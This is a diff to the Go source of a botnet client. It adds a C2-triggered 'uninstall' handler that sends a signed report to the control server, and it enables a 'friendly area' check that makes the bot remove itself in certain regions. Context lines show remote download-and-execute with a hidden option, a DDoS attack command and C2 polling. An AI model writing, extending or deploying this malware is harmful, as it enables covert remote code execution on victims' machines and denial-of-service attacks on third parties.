@@ -19,6 +19,31 @@ func do_register_bot(pkg *ServerReply, host string) bool {
 	return false
 }
 
+func do_uninstall_bot(pkg *ServerReply, host string) {
+	report := Report{
+		Guid:    g_guid,
+		TaskID:  strconv.FormatInt(pkg.TaskId, 10),
+		Success: true,
+		Output:  "",
+		Error:   "done",
+		Extra:   make(map[string]any),
+	}
+	report.Extra["action"] = "uninstall"
+	// To json
+	byt, _ := json.Marshal(report)
+	// Build url
+	url := build_url(host, "/report", botcore.use_ssl)
+	timestamp := generate_utc_timestamp_string()
+	sign := create_sign(g_token, g_guid, timestamp)
+	do_head_post(url, byt, map[string]string{
+		"X-Guid": g_guid,
+		"X-Time": timestamp,
+		"X-Sign": base64_enc(sign),
+	}, botcore.use_ssl)
+	// Install self
+	uninstall()
+}
+
 func do_remote_download_execute(pkg *ServerReply, host string) bool {
 	commandline := pkg.Args["args"].(string)
 	hidden := pkg.Args["hidden"].(bool)
@@ -53,7 +78,6 @@ func do_remote_download_execute(pkg *ServerReply, host string) bool {
 	}
 	report.Extra["action"] = action
 	byt, _ := json.Marshal(report)
-	// Send report to C2
 
 	// Build url
 	url := build_url(host, "/report", botcore.use_ssl)
@@ -119,6 +143,9 @@ func send_poll_request(host string) BotState {
 	case "execute":
 		// Remote download execution
 		do_remote_download_execute(reply, host)
+	case "uninstall":
+		// Uninstall self
+		do_uninstall_bot(reply, host)
 	case "ddos":
 		do_ddos_attack(reply, host)
 	case "poll":
@@ -283,9 +310,9 @@ func read_config() bool {
 
 func Run() {
 	// Uninstall if machine in friendly areas
-	//if run_on_friendly_area() {
-	//	uinstall()
-	//}
+	if run_on_friendly_area() {
+		uninstall()
+	}
 	// Read configure
 	if !read_config() {
 		os.Exit(0)
